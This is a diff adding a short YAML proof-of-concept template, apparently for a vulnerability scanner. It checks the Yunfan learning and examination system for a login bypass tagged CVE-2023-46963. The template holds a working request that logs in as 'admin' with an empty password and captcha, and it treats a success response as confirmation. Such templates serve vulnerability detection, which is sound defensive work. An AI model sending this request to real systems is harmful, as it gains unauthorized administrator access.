@@ -1,0 +1,27 @@
+id: poc-yaml-yunfan-learning-examination-system-login-bypass
+info:
+  name: 云帆学习考试系统 未正确校验输入
+  severity: high
+  tags:
+  - CVE-2023-46963
+  - 输入验证错误
+  finger: 云帆学习考试系统
+variables: {}
+requests:
+- method: POST
+  path: /api/sys/user/login
+  headers:
+    Content-Type: application/json
+  data: '{"smsCode":"","captchaKey":"","captchaValue":"","username":"admin","password":""}
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body, "\"code\":0,")
+
+    && contains(body, "\"msg\":\"操作成功！\"")
+
+    && contains(body, "\"success\":true")
+
+    '
+transport: http
